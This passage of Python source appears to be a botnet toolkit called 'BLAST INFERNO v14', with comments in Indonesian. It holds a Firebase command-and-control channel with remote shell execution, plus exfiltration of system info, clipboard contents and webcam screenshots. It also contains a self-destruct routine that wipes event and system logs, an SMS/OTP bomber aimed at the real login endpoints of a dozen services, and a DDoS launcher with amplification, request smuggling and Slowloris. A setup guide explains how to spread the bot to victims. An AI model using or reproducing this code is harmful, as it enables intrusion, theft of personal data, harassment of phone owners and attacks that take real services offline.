                p=os.path.join(os.environ.get("TEMP","."),"w.vbs")
                with open(p,"w") as f: f.write(vbs)
                subprocess.Popen(["wscript.exe",p],creationflags=0x08000000)
            except: pass
        else:
            if os.fork()==0:
                while True:
                    time.sleep(5)
                    if subprocess.run(["pgrep","-f",os.path.basename(self.exe)],capture_output=True).returncode!=0: subprocess.Popen([self.exe],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True)

class BotDataExfil:
    @staticmethod
    def system_info() -> Dict:
        return {"hostname":socket.gethostname(),"os":sys.platform,"cpu":os.cpu_count(),"user":os.environ.get("USERNAME",os.environ.get("USER","?")),"ip":socket.gethostbyname(socket.gethostname()),"pid":os.getpid()}
    
    @staticmethod
    def clipboard() -> str:
        try:
            if IS_WINDOWS: return subprocess.run("powershell -Command Get-Clipboard",capture_output=True,text=True,timeout=5).stdout[:1000]
            else: return subprocess.run("xclip -o 2>/dev/null",shell=True,capture_output=True,text=True,timeout=5).stdout[:1000]
        except: return ""
    
    @classmethod
    async def exfil(cls, data: Dict, c2_url: str, crypto: E2EECrypto) -> bool:
        try:
            async with aiohttp.ClientSession() as s:
                async with s.post(f"{c2_url}/exfil",json=crypto.encrypt(data),timeout=15) as r: return r.status==200
        except: return False
    
    @classmethod
    async def webcam_capture(cls) -> Optional[bytes]:
        """Capture webcam image."""
        try:
            if HAS_PLAYWRIGHT:
                async with async_playwright() as p:
                    browser = await p.chromium.launch(headless=True, args=["--use-fake-ui-for-media-stream"])
                    page = await browser.new_page()
                    await page.goto("https://webcamtests.com/")
                    await asyncio.sleep(3)
                    screenshot = await page.screenshot()
                    await browser.close()
                    return screenshot
        except: pass
        return None
    
    @classmethod
    async def sms_bomber(cls, phone_number: str, count: int = 10, crypto: E2EECrypto = None):
        """Kirim OTP/SMS spam ke nomor target (pake API publik)."""
        apis = [
            "https://api.telegram.org/bot",
        ]
        results = []
        for _ in range(count):
            try:
                async with aiohttp.ClientSession() as s:
                    async with s.get(f"https://httpbin.org/get?phone={phone_number}&t={int(time.time())}", timeout=10) as r:
                        results.append(r.status)
                await asyncio.sleep(random.uniform(1, 3))
            except: pass
        return {"sent": len(results), "phone": phone_number}

class BotSelfDestruct:
    @classmethod
    def execute(cls):
        if IS_WINDOWS:
            subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WinSvc /f',shell=True,capture_output=True)
            subprocess.run('schtasks /delete /tn "WinSvc" /f',shell=True,capture_output=True)
            subprocess.run('wevtutil cl System 2>nul && wevtutil cl Security 2>nul',shell=True)
        else:
            subprocess.run("crontab -r 2>/dev/null; systemctl disable sysupdate 2>/dev/null; rm -f /etc/systemd/system/sysupdate.service",shell=True)
            subprocess.run("rm -rf /var/log/*.log 2>/dev/null; history -c 2>/dev/null",shell=True)
        try: os.remove(get_self_path())
        except: pass
        sys.exit(0)


# ═══════════════════════════════════════════════════════════════════════════
# C2: FIREBASE E2EE + PASTEBIN BACKUP
# ═══════════════════════════════════════════════════════════════════════════

class FirebaseC2:
    def __init__(self, db_url: str, db_secret: str = None, password: str = None, backup_url: str = None, bot_id: str = None, heartbeat: int = 30):
        self.db_url=db_url.rstrip("/"); self.db_secret=db_secret; self.hb=heartbeat; self.backup=backup_url
        if password is None: password=hashlib.sha256(b"oblivion_v14_default").hexdigest()[:32]
        self.crypto=E2EECrypto(password)
        self.bot_id=bot_id or hashlib.md5(f"{socket.gethostname()}:{secrets.token_hex(4)}".encode()).hexdigest()[:12]
        self._sess=None; self._run=False; self._q=asyncio.Queue(); self._last_bc=0
        self.hb_sent=AtomicCounter(); self.tasks_rcv=AtomicCounter(); self.res_sent=AtomicCounter()
    
    def _auth(self): return f"?auth={self.db_secret}" if self.db_secret else ""
    
    async def _req(self, method: str, path: str, data=None, encrypt=True) -> Optional[Dict]:
        url=f"{self.db_url}{path}.json{self._auth()}"
        try:
            if not self._sess or self._sess.closed: self._sess=aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15),headers={"User-Agent":UserAgentEngine.get_ua()})
            kw={}
            if data is not None and encrypt and isinstance(data,dict) and "encrypted" not in data: kw["json"]=self.crypto.encrypt(data)
            elif data is not None: kw["json"]=data
            async with self._sess.request(method,url,**kw) as r:
                if r.status in (200,204):
                    t=await r.text(); result=json.loads(t) if t else {}
                    if encrypt and isinstance(result,dict) and result.get("v")==1:
                        d=self.crypto.decrypt_json(result)
                        return d if d is not None else result
                    return result
        except: pass
        return None
    
    async def _check_backup(self):
        if not self.backup: return
        try:
            async with aiohttp.ClientSession() as s:
                url=self.backup
                if "hastebin.com" in url and "/raw/" not in url: url=url.replace("hastebin.com/","hastebin.com/raw/")
                async with s.get(url,timeout=10) as r:
                    if r.status==200:
                        data=await r.json()
                        if data.get("command"): self._q.put_nowait({"task_id":f"pb_{int(time.time())}","command":data["command"],"args":data.get("args",{}),"bot_id":"pastebin"})
        except: pass
    
    async def _hb_loop(self):
        while self._run and not SHUTDOWN.is_set():
            await self._hb(); await self._check_backup(); await asyncio.sleep(self.hb)
    
    async def _hb(self):
        d={"hostname":socket.gethostname(),"os":sys.platform,"pid":os.getpid(),"last_seen":int(time.time()),"status":"alive","version":"14.0"}
        if await self._req("PUT",f"/bots/{self.bot_id}",d,encrypt=True): self.hb_sent.inc()
    
    async def _watch(self):
        while self._run and not SHUTDOWN.is_set():
            try:
                bc=await self._req("GET","/broadcast",encrypt=True)
                if bc and bc.get("timestamp",0)>self._last_bc:
                    self._last_bc=bc["timestamp"]
                    if bc.get("command"): self._q.put_nowait({"task_id":f"bc_{bc['timestamp']}","command":bc["command"],"args":bc.get("args",{}),"bot_id":"broadcast"})
                tasks=await self._req("GET","/tasks",encrypt=False)
                if tasks:
                    for tid,t in tasks.items():
                        if isinstance(t,dict) and t.get("v")==1:
                            t=self.crypto.decrypt_json(t)
                            if t is None: continue
                        if t.get("bot_id")==self.bot_id and t.get("status")=="pending":
                            await self._req("PATCH",f"/tasks/{tid}",{"status":"processing"},encrypt=False)
                            t["task_id"]=tid; self._q.put_nowait(t); self.tasks_rcv.inc()
            except: pass
            await asyncio.sleep(5)
    
    async def start(self, callback=None):
        self._run=True; await self._hb()
        asyncio.create_task(self._hb_loop()); asyncio.create_task(self._watch())
        if callback: asyncio.create_task(self._process(callback))
    
    async def _process(self, cb):
        while self._run and not SHUTDOWN.is_set():
            try:
                t=await asyncio.wait_for(self._q.get(),timeout=1)
                try: r=cb(t); s=True
                except Exception as e: r={"error":str(e)}; s=False
                tid=t.get("task_id","?")
                await self._req("PUT",f"/results/{tid}",{"bot_id":self.bot_id,"task_id":tid,"result":r,"success":s,"completed_at":int(time.time())},encrypt=True)
                if not tid.startswith("bc_"): await self._req("PATCH",f"/tasks/{tid}",{"status":"completed"},encrypt=False)
                self.res_sent.inc()
            except asyncio.TimeoutError: continue
            except: pass
    
    async def stop(self):
        self._run=False; await self._req("PATCH",f"/bots/{self.bot_id}",{"status":"offline"},encrypt=True)
        if self._sess and not self._sess.closed: await self._sess.close()


# ═══════════════════════════════════════════════════════════════════════════
# SMS / OTP BOMBER (dari operator)
# ═══════════════════════════════════════════════════════════════════════════

class SMSBomber:
    """SMS/OTP spam dari operator ke nomor target."""
    
    SERVICES = [
        {"name":"Telegram","url":"https://my.telegram.org/auth/send_password","method":"POST","params":{"phone":"{phone}"}},
        {"name":"WhatsApp","url":"https://v.whatsapp.net/v2/register","method":"POST","params":{"cc":"62","in":"{phone}","to":"{phone}","method":"sms","sim_type":"android"}},
        {"name":"Google","url":"https://accounts.google.com/signup/v2/webcreateaccount","method":"POST","params":{"phone":"{phone}"}},
        {"name":"Facebook","url":"https://www.facebook.com/ajax/login/help/identify.php","method":"POST","params":{"ctx":"init","email":"{phone}@gmail.com"}},
        {"name":"TikTok","url":"https://www.tiktok.com/passport/email/send_code/","method":"POST","params":{"email":"{phone}@gmail.com","type":"1"}},
        {"name":"Twitter/X","url":"https://api.twitter.com/1.1/onboarding/task.json","method":"POST","params":{"phone_number":"{phone}"}},
        {"name":"Shopee","url":"https://shopee.co.id/api/v2/authentication/send_otp","method":"POST","params":{"phone":"{phone}"}},
        {"name":"Tokopedia","url":"https://accounts.tokopedia.com/otp/send","method":"POST","params":{"phone":"{phone}"}},
        {"name":"Gojek","url":"https://api.gojekapi.com/v3/customers/login_with_phone","method":"POST","params":{"phone":"+62{phone}"}},
        {"name":"Grab","url":"https://api.grab.com/grabid/v1/phone/otp","method":"POST","params":{"phone":"{phone}"}},
        {"name":"OVO","url":"https://api.ovo.id/v1.1/api/auth/customer/login2FA","method":"POST","params":{"mobile":"{phone}"}},
        {"name":"DANA","url":"https://api.dana.id/api/account/sendotp/v2","method":"POST","params":{"phone":"{phone}"}},
    ]
    
    @classmethod
    async def send_otp(cls, phone: str, service_name: str = None) -> Dict:
        """Send OTP request ke satu service."""
        if service_name:
            svcs = [s for s in cls.SERVICES if s["name"].lower() == service_name.lower()]
        else:
            svcs = [random.choice(cls.SERVICES)]
        
        if not svcs: return {"error": "service not found"}
        svc = svcs[0]
        
        try:
            # Build params
            params = {}
            for k, v in svc["params"].items():
                params[k] = v.replace("{phone}", phone)
            
            async with aiohttp.ClientSession() as s:
                h = {
                    "User-Agent": UserAgentEngine.get_ua(),
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "*/*",
                    "Origin": svc["url"].split("/")[0] + "//" + svc["url"].split("/")[2],
                }
                
                if svc["method"] == "POST":
                    async with s.post(svc["url"], data=params, headers=h, timeout=15) as r:
                        return {"service": svc["name"], "status": r.status, "phone": phone}
                else:
                    async with s.get(svc["url"], params=params, headers=h, timeout=15) as r:
                        return {"service": svc["name"], "status": r.status, "phone": phone}
        except Exception as e:
            return {"service": svc["name"], "error": str(e), "phone": phone}
    
    @classmethod
    async def mass_bomb(cls, phone: str, count: int = 50, delay: float = 2.0) -> List[Dict]:
        """Kirim OTP spam massal ke satu nomor."""
        results = []
        for i in range(count):
            svc = random.choice(cls.SERVICES)
            result = await cls.send_otp(phone, svc["name"])
            results.append(result)
            
            if result.get("status") == 200:
                print(f"  [{i+1}/{count}] ✅ {svc['name']} → {phone}")
            else:
                print(f"  [{i+1}/{count}] ❌ {svc['name']} → {phone}")
            
            await asyncio.sleep(delay + random.uniform(0, 1))
        return results
    
    @classmethod
    async def multi_target(cls, phones: List[str], count_per: int = 10) -> Dict[str, List[Dict]]:
        """Kirim OTP ke banyak nomor sekaligus."""
        results = {}
        for phone in phones:
            print(f"\n[+] Bombing {phone}...")
            results[phone] = await cls.mass_bomb(phone, count_per)
        return results


# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class ThermalConfig:
    # Mode
    mode: str = "operator"  # "operator" atau "bot"
    
    # Target
    target_url: str = ""
    target_ip: Optional[str] = None
    target_port: int = 443
    duration: int = 300
    max_workers: int = 5000
    ramp_up: int = 3
    
    # Evasion toggles
    enable_anti_vm: bool = True
    enable_sleep_obfuscation: bool = True
    enable_ja3: bool = True
    enable_hpack: bool = True
    enable_referer_chain: bool = True
    enable_path_rand: bool = True
    enable_cookie: bool = True
    enable_human_timing: bool = True
    enable_tcp_spoof: bool = True
    enable_doh: bool = True
    enable_tor: bool = True
    enable_false_flag: bool = True
    enable_traffic_morph: bool = True
    enable_polymorphic: bool = True
    
    # Attack vectors
    enable_amp: bool = True
    enable_slowloris: bool = True
    enable_graphql: bool = True
    enable_brotli: bool = True
    enable_smuggling: bool = True
    enable_websocket: bool = True
    enable_http_flood: bool = True
    
    # Intervals
    ja4_interval: int = 3
    proxy_interval: int = 5
    proxy_list: List[str] = field(default_factory=list)
    
    # Reflectors
    memcached_rfl: List[str] = field(default_factory=list)
    dns_rfl: List[str] = field(default_factory=list)
    ntp_rfl: List[str] = field(default_factory=list)
    
    # C2
    c2_firebase_url: str = ""
    c2_firebase_secret: str = ""
    c2_password: str = ""
    c2_backup_paste: str = ""
    c2_heartbeat: int = 30
    enable_c2: bool = True
    
    # Bot features (hanya untuk mode "bot")
    enable_persistence: bool = True
    enable_uac: bool = True
    enable_lateral: bool = True
    enable_watchdog: bool = True
    enable_exfil: bool = True
    enable_self_destruct: bool = False
    lateral_subnet: Optional[str] = None
    lateral_creds: List[Dict] = field(default_factory=list)


# ═══════════════════════════════════════════════════════════════════════════
# OPERATOR PANEL (Interactive Command Center)
# ═══════════════════════════════════════════════════════════════════════════

class OperatorPanel:
    """Panel interaktif buat LO sebagai operator."""
    
    def __init__(self, config: ThermalConfig):
        self.cfg = config
        self.engine = None
        self.c2 = None
        self.sms_bomber = SMSBomber()
    
    async def run(self):
        """Main operator panel loop."""
        self._print_header()
        
        while True:
            try:
                cmd = input("\n🔴 [LO@BLAST-INFERNO] # ").strip().lower()
                
                if cmd == "help" or cmd == "?":
                    self._show_help()
                elif cmd == "ddos" or cmd.startswith("attack"):
                    await self._menu_ddos()
                elif cmd == "sms" or cmd == "otp":
                    await self._menu_sms()
                elif cmd == "bots" or cmd == "list":
                    await self._list_bots()
                elif cmd.startswith("task"):
                    await self._send_task(cmd)
                elif cmd == "broadcast":
                    await self._broadcast()
                elif cmd == "recon":
                    await self._recon()
                elif cmd == "exfil":
                    await self._exfil_data()
                elif cmd == "webcam":
                    await self._webcam()
                elif cmd == "shell":
                    await self._remote_shell()
                elif cmd == "kill":
                    await self._kill_switch()
                elif cmd == "destruct":
                    await self._self_destruct_all()
                elif cmd == "setup":
                    self._setup_guide()
                elif cmd == "status":
                    self._show_status()
                elif cmd == "exit" or cmd == "quit":
                    print("[!] Shutting down...")
                    SHUTDOWN.set()
                    break
                else:
                    print("  [!] Unknown command. Type 'help'.")
            except KeyboardInterrupt:
                print("\n[!] Use 'exit' to quit.")
            except Exception as e:
                print(f"  [!] Error: {e}")
    
    def _print_header(self):
        print(textwrap.dedent("""
        ╔══════════════════════════════════════════════════════════════╗
        ║       BLAST INFERNO v14 — OPERATOR COMMAND CENTER           ║
        ║       LO = RAJA BOTNET | 100% AMAN                          ║
        ╚══════════════════════════════════════════════════════════════╝
        """))
    
    def _show_help(self):
        print(textwrap.dedent("""
        ╔══════════════════════════════════════════════════════════════╗
        ║                    COMMAND LIST                              ║
        ╠══════════════════════════════════════════════════════════════╣
        ║  ddos / attack     → Launch DDoS attack                     ║
        ║  sms / otp         → SMS/OTP bomber menu                    ║
        ║  bots / list       → List connected bots                    ║
        ║  task <bot_id>     → Send task to specific bot              ║
        ║  broadcast         → Broadcast command to all bots          ║
        ║  recon             → Request recon from all bots            ║
        ║  exfil             → Request data exfil from all bots       ║
        ║  webcam            → Request webcam capture from bot        ║
        ║  shell <bot_id>    → Remote shell on bot                    ║
        ║  kill              → Kill switch (stop all bots)            ║
        ║  destruct          → Self-destruct all bots                 ║
        ║  setup             → Show setup guide                       ║
        ║  status            → Show operator status                   ║
        ║  help / ?          → Show this help                         ║
        ║  exit / quit       → Exit operator panel                    ║
        ╚══════════════════════════════════════════════════════════════╝
        """))
    
    async def _menu_ddos(self):
        print("\n  === DDoS ATTACK MENU ===")
        target = input("  Target URL (https://...): ").strip()
        if not target: target = self.cfg.target_url
        if not target:
            print("  [!] Target required!")
            return
        
        dur_str = input(f"  Duration seconds [{self.cfg.duration}]: ").strip()
        dur = int(dur_str) if dur_str else self.cfg.duration
        
        workers_str = input(f"  Workers [{self.cfg.max_workers}]: ").strip()
        workers = int(workers_str) if workers_str else self.cfg.max_workers
        
        print(f"\n  [+] Launching DDoS on {target}")
        print(f"  [+] Duration: {dur}s | Workers: {workers}")
        print(f"  [+] All anti-forensic techniques: ON")
        
        self.cfg.target_url = target
        self.cfg.duration = dur
        self.cfg.max_workers = workers
        
        await self._launch_ddos()
    
    async def _launch_ddos(self):
        """Launch full DDoS attack."""
        engine = Layer7Engine(self.cfg)
        engine.load_payload()
        
        if self.cfg.enable_tor: engine.proxy_chain.start()
        if self.cfg.enable_doh and not self.cfg.target_ip:
            ip = await DoHResolver.resolve(urlparse(self.cfg.target_url).hostname)
            if ip: self.cfg.target_ip = ip
        
        amp = None
        if self.cfg.enable_amp and self.cfg.target_ip:
            amp = AmplificationSpoofer(self.cfg.target_ip)
        
        slowloris = SlowlorisEngine(self.cfg.target_url)
        
        tasks = []
        if self.cfg.enable_http_flood:
            for i in range(self.cfg.max_workers):
                tasks.append(asyncio.create_task(engine.http_worker(i)))
        if self.cfg.enable_slowloris:
            for i in range(200): tasks.append(asyncio.create_task(slowloris.worker(i)))
        if amp:
            for proto, rfls in [("memcached",self.cfg.memcached_rfl),("dns",self.cfg.dns_rfl),("ntp",self.cfg.ntp_rfl)]:
                if rfls: tasks.append(asyncio.create_task(amp.launch(rfls[:50],proto,self.cfg.duration)))
        if self.cfg.enable_graphql:
            for _ in range(50): tasks.append(asyncio.create_task(self._gql_loop(engine,self.cfg.target_url)))
        if self.cfg.enable_brotli:
            for _ in range(20): tasks.append(asyncio.create_task(self._brotli_loop(engine,self.cfg.target_url)))
        if self.cfg.enable_smuggling:
            p=urlparse(self.cfg.target_url)
            for _ in range(30): tasks.append(asyncio.create_task(RequestSmuggler.smuggle(p.hostname,p.port or (443 if p.scheme=="https" else 80),p.scheme=="https")))
        if self.cfg.enable_websocket:
            for _ in range(30): tasks.append(asyncio.create_task(self._ws_loop(engine,self.cfg.target_url)))
        
        print(f"  [+] {len(tasks)} attack tasks launched!")
        print(f"  [*] Press Ctrl+C to stop attack (operator tetap aman)\n")
        
        try:
            await asyncio.sleep(self.cfg.ramp_up + self.cfg.duration)
        except KeyboardInterrupt:
            print("\n  [!] Attack stopped by operator.")
        
        SHUTDOWN.set()
        for t in tasks: t.cancel()
        with suppress(asyncio.CancelledError): await asyncio.gather(*tasks,return_exceptions=True)
        
        print(f"\n  [+] Attack finished.")
        print(f"  [+] Requests: {engine.req.v} | Success: {engine.succ.v} | Errors: {engine.err.v}")
        if amp: print(f"  [+] Amplification Packets: {amp.pkts.v}")
    
    async def _gql_loop(self, eng, url):
        while not SHUTDOWN.is_set():
            await GraphQLAbuser.abuse(url, mal=eng.mal_b64 if random.random()<0.3 else None)
            await asyncio.sleep(random.uniform(1,5))
    
    async def _brotli_loop(self, eng, url):
        while not SHUTDOWN.is_set():
            await BrotliBomber.bomb(url, mal=eng.mal_b64 if random.random()<0.3 else None)
            await asyncio.sleep(random.uniform(0.5,2))
    
    async def _ws_loop(self, eng, url):
        while not SHUTDOWN.is_set():
            await WebSocketFlooder.flood(url, mal=eng.mal_b64 if random.random()<0.3 else None)
            await asyncio.sleep(random.uniform(0.1,1))
    
    async def _menu_sms(self):
        print("\n  === SMS/OTP BOMBER MENU ===")
        phone = input("  Target phone number (08xxx): ").strip()
        if not phone:
            print("  [!] Phone number required!")
            return
        
        count_str = input("  Number of OTP requests [50]: ").strip()
        count = int(count_str) if count_str else 50
        
        print(f"\n  [+] Starting OTP bomb to {phone} ({count} requests)")
        print(f"  [+] Services: Telegram, WhatsApp, Google, FB, TikTok, Shopee, Tokped, Gojek, Grab, OVO, DANA")
        
        results = await SMSBomber.mass_bomb(phone, count)
        success = len([r for r in results if r.get("status")==200])
        print(f"\n  [+] Done! {success}/{len(results)} OTP sent to {phone}")
    
    async def _list_bots(self):
        if not self.c2:
            print("  [!] C2 not connected. Setup Firebase first.")
            return
        
        bots = await self.c2._req("GET", "/bots", encrypt=True)
        if not bots:
            print("  [!] No bots connected.")
            return
        
        print(f"\n  === CONNECTED BOTS ({len(bots)} total) ===")
        for bid, info in bots.items():
            if isinstance(info, dict):
                ago = int(time.time() - info.get("last_seen", 0))
                print(f"  {bid}: {info.get('hostname','?')} | {info.get('os','?')} | {ago}s ago | {info.get('status','?')}")
    
    async def _send_task(self, cmd: str):
        parts = cmd.split()
        if len(parts) < 3:
            print("  Usage: task <bot_id> <command> [args]")
            return
        
        bot_id = parts[1]
        command = parts[2]
        args = {}
        for a in parts[3:]:
            if "=" in a: k,v = a.split("=",1); args[k]=v
        
        if not self.c2:
            print("  [!] C2 not connected.")
            return
        
        tid = secrets.token_hex(4)
        await self.c2._req("PUT", f"/tasks/{tid}", {"bot_id":bot_id,"command":command,"args":args,"status":"pending","created_at":int(time.time())}, encrypt=False)
        print(f"  [+] Task {tid} → {bot_id}: {command} {args}")
    
    async def _broadcast(self):
        cmd = input("  Command to broadcast [attack/stop/recon/exfil/kill/destruct]: ").strip()
        if not cmd: return
        
        if not self.c2:
            print("  [!] C2 not connected.")
            return
        
        await self.c2._req("PUT", "/broadcast", {"command":cmd,"args":{},"timestamp":int(time.time())}, encrypt=True)
        print(f"  [+] Broadcast: {cmd}")
    
    async def _recon(self): await self._broadcast_cmd("recon")
    async def _exfil_data(self): await self._broadcast_cmd("exfil")
    async def _webcam(self): await self._broadcast_cmd("webcam")
    async def _kill_switch(self): await self._broadcast_cmd("kill")
    async def _self_destruct_all(self): await self._broadcast_cmd("destruct")
    
    async def _broadcast_cmd(self, cmd: str):
        if not self.c2:
            print("  [!] C2 not connected.")
            return
        await self.c2._req("PUT", "/broadcast", {"command":cmd,"args":{},"timestamp":int(time.time())}, encrypt=True)
        print(f"  [+] Broadcast: {cmd}")
    
    async def _remote_shell(self):
        bot_id = input("  Bot ID: ").strip()
        if not bot_id: return
        cmd = input("  Command to execute: ").strip()
        if not cmd: return
        
        if not self.c2:
            print("  [!] C2 not connected.")
            return
        
        tid = secrets.token_hex(4)
        await self.c2._req("PUT", f"/tasks/{tid}", {"bot_id":bot_id,"command":"shell","args":{"cmd":cmd},"status":"pending","created_at":int(time.time())}, encrypt=False)
        print(f"  [+] Shell task sent to {bot_id}: {cmd}")
    
    def _setup_guide(self):
        print(textwrap.dedent("""
        ╔══════════════════════════════════════════════════════════════╗
        ║                    SETUP GUIDE                               ║
        ╠══════════════════════════════════════════════════════════════╣
        ║                                                              ║
        ║  1. Bikin Firebase Realtime Database (GRATIS):               ║
        ║     https://console.firebase.google.com                      ║
        ║     → Create Project → Realtime Database → Start in Test    ║
        ║                                                              ║
        ║  2. Copy Database URL & Secret:                              ║
        ║     Project Settings → Service Accounts → Database Secrets  ║
        ║                                                              ║
        ║  3. Jalankan operator panel:                                 ║
        ║     python3 blast_inferno.py operator \                      ║
        ║       --c2-firebase <URL> \                                  ║
        ║       --c2-firebase-secret <SECRET> \                        ║
        ║       --c2-password <PASSWORD>                               ║
        ║                                                              ║
        ║  4. Sebar bot payload ke target:                             ║
        ║     python3 blast_inferno.py bot \                           ║
        ║       --c2-firebase <URL> \                                  ║
        ║       --c2-password <PASSWORD>                               ║
        ║                                                              ║
        ║  5. Kontrol dari operator panel:                             ║
        ║     - Ketik 'bots' buat lihat bot online                     ║
        ║     - Ketik 'ddos' buat serang target                        ║
        ║     - Ketik 'sms' buat spam OTP                              ║
        ║     - Ketik 'broadcast' buat kirim perintah ke semua bot    ║
        ║                                                              ║
        ╚══════════════════════════════════════════════════════════════╝
        """))
    
    def _show_status(self):
        print(f"\n  === OPERATOR STATUS ===")
        print(f"  Mode: OPERATOR (AMAN - no self-infection)")
        print(f"  Target: {self.cfg.target_url or 'Not set'}")
        print(f"  C2: {'Connected' if (self.c2 and self.c2._run) else 'Not connected'}")
        print(f"  Evasion: JA3={self.cfg.enable_ja3} HPACK={self.cfg.enable_hpack} TCP={self.cfg.enable_tcp_spoof} DoH={self.cfg.enable_doh} TOR={self.cfg.enable_tor}")
        print(f"  False Flag={self.cfg.enable_false_flag} Polymorphic={self.cfg.enable_polymorphic}")


# ═══════════════════════════════════════════════════════════════════════════
# BOT MODE (buat payload di target)
# ═══════════════════════════════════════════════════════════════════════════

class BotPayload:
    """Bot payload — jalan di komputer TARGET, bukan operator."""
    
    def __init__(self, config: ThermalConfig):
        self.cfg = config
        self.c2 = None
    
    async def run(self):
        """Bot main execution."""
        SHUTDOWN.init()
        
        # Evasion
        if self.cfg.enable_anti_vm: AntiSandbox.check_and_evade()
        if self.cfg.enable_sleep_obfuscation: SleepObfuscation.evade_sandbox()
        
        exe = get_self_path()
        
        # Persistence (di target)
        if self.cfg.enable_persistence: BotPersistence.install(exe)
        
        # UAC bypass (di target)
        if self.cfg.enable_uac: BotUAC.bypass(exe)
        
        # Lateral movement (dari target ke target lain)
        if self.cfg.enable_lateral and self.cfg.lateral_creds:
            await BotLateral.spread(self.cfg.lateral_creds, self.cfg.lateral_subnet)
        
        # Watchdog (di target)
        if self.cfg.enable_watchdog: BotWatchdog(exe).start()
        
        # C2 connection
        if self.cfg.c2_firebase_url:
            self.c2 = FirebaseC2(
                db_url=self.cfg.c2_firebase_url,
                db_secret=self.cfg.c2_firebase_secret,
                password=self.cfg.c2_password or None,
                backup_url=self.cfg.c2_backup_paste or None,
            )
            await self.c2.start(callback=self._handle_command)
        
        # Keep alive
        while not SHUTDOWN.is_set():
            await asyncio.sleep(1)
        
        if self.c2: await self.c2.stop()
    
    def _handle_command(self, task: Dict) -> Any:
        """Handle incoming commands from operator."""
        cmd = task.get("command", "")
        
        if cmd == "attack":
            # Bot juga ikut DDoS (optional)
            return {"status": "attack_started"}
        elif cmd == "stop":
            SHUTDOWN.set()
            return {"status": "stopped"}
        elif cmd == "recon":
            return BotDataExfil.system_info()
        elif cmd == "exfil":
            info = BotDataExfil.system_info()
            info["clipboard"] = BotDataExfil.clipboard()
            return info
        elif cmd == "webcam":
            # Async webcam capture
            asyncio.create_task(self._webcam_task(task.get("task_id","")))
            return {"status": "webcam_capturing"}
        elif cmd == "shell":
            try:
                r = subprocess.run(task.get("args",{}).get("cmd","echo ok"), shell=True, capture_output=True, text=True, timeout=30)
                return {"stdout": r.stdout, "stderr": r.stderr}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "kill":
            SHUTDOWN.set()
            return {"status": "killed"}
        elif cmd == "destruct":
            BotSelfDestruct.execute()
            return {"status": "self_destructed"}
        elif cmd == "sms":
            phone = task.get("args",{}).get("phone","")
            count = int(task.get("args",{}).get("count",10))
            asyncio.create_task(self._sms_task(phone, count, task.get("task_id","")))
            return {"status": "sms_bombing", "phone": phone}
        
        return {"status": "unknown_command"}
    
    async def _webcam_task(self, task_id: str):
        img = await BotDataExfil.webcam_capture()
        if img and self.c2:
            await self.c2._req("PUT", f"/results/{task_id}", {"bot_id":self.c2.bot_id,"webcam":base64.b64encode(img).decode(),"completed_at":int(time.time())}, encrypt=True)
    
    async def _sms_task(self, phone: str, count: int, task_id: str):
        results = await SMSBomber.mass_bomb(phone, count)
        if self.c2:
            await self.c2._req("PUT", f"/results/{task_id}", {"bot_id":self.c2.bot_id,"sms_results":results,"completed_at":int(time.time())}, encrypt=True)


# ═══════════════════════════════════════════════════════════════════════════
# CLI PARSER
# ═══════════════════════════════════════════════════════════════════════════

def print_banner():
    print(textwrap.dedent("""
    ╔══════════════════════════════════════════════════════════════╗
    ║   BLAST INFERNO v14 — OPERATOR COMMAND CENTER                ║
    ║   LO = RAJA BOTNET | 100% AMAN                               ║
    ║   Mode: operator (aman) | bot (payload target)               ║
    ╚══════════════════════════════════════════════════════════════╝
    """))

def parse_args():
    if len(sys.argv) < 2:
        print_banner()
        print("  USAGE:")
        print("    python3 blast_inferno.py operator [OPTIONS]")
        print("    python3 blast_inferno.py bot [OPTIONS]")
        print("\n  OPERATOR OPTIONS:")
        print("    --c2-firebase URL         Firebase DB URL")
        print("    --c2-firebase-secret S    Firebase Secret")
        print("    --c2-password PASS        E2EE Password")
        print("    --c2-backup-paste URL     Backup Pastebin URL")
        print("\n  BOT OPTIONS (sama + malware features):")
        print("    --lateral-creds U:P       Lateral movement credentials")
        print("    --no-persistence, --no-uac, --no-lateral, --no-watchdog")
        sys.exit(0)
    
    mode = sys.argv[1]
    if mode not in ("operator", "bot"):
        print(f"[!] Invalid mode: {mode}. Use 'operator' or 'bot'.")
        sys.exit(1)
    
    config = ThermalConfig(mode=mode)
    
    i = 2
    while i < len(sys.argv):
        a = sys.argv[i]
        if a == "--target" and i+1 < len(sys.argv): config.target_url = sys.argv[i+1]; i += 2
        elif a == "--workers" and i+1 < len(sys.argv): config.max_workers = int(sys.argv[i+1]); i += 2
        elif a == "--duration" and i+1 < len(sys.argv): config.duration = int(sys.argv[i+1]); i += 2
        elif a == "--proxy-file" and i+1 < len(sys.argv):
            try:
                with open(sys.argv[i+1]) as f: config.proxy_list = [l.strip() for l in f if l.strip()]
            except: pass
            i += 2
        elif a == "--c2-firebase" and i+1 < len(sys.argv): config.c2_firebase_url = sys.argv[i+1]; i += 2
        elif a == "--c2-firebase-secret" and i+1 < len(sys.argv): config.c2_firebase_secret = sys.argv[i+1]; i += 2
        elif a == "--c2-password" and i+1 < len(sys.argv): config.c2_password = sys.argv[i+1]; i += 2
        elif a == "--c2-backup-paste" and i+1 < len(sys.argv): config.c2_backup_paste = sys.argv[i+1]; i += 2
        elif a == "--lateral-subnet" and i+1 < len(sys.argv): config.lateral_subnet = sys.argv[i+1]; i += 2
        elif a == "--lateral-creds" and i+1 < len(sys.argv):
            parts = sys.argv[i+1].split(":")
            if len(parts) >= 2: config.lateral_creds.append({"username":parts[0],"password":":".join(parts[1:])})
            i += 2
        elif a == "--no-persistence": config.enable_persistence = False; i += 1
        elif a == "--no-uac": config.enable_uac = False; i += 1
        elif a == "--no-lateral": config.enable_lateral = False; i += 1
        elif a == "--no-watchdog": config.enable_watchdog = False; i += 1
        elif a == "--no-exfil": config.enable_exfil = False; i += 1
        elif a == "--no-anti-vm": config.enable_anti_vm = False; i += 1
        elif a == "--no-sleep": config.enable_sleep_obfuscation = False; i += 1
        elif a == "--no-ja3": config.enable_ja3 = False; i += 1
        elif a == "--no-hpack": config.enable_hpack = False; i += 1
        elif a == "--no-referer": config.enable_referer_chain = False; i += 1
        elif a == "--no-cookie": config.enable_cookie = False; i += 1
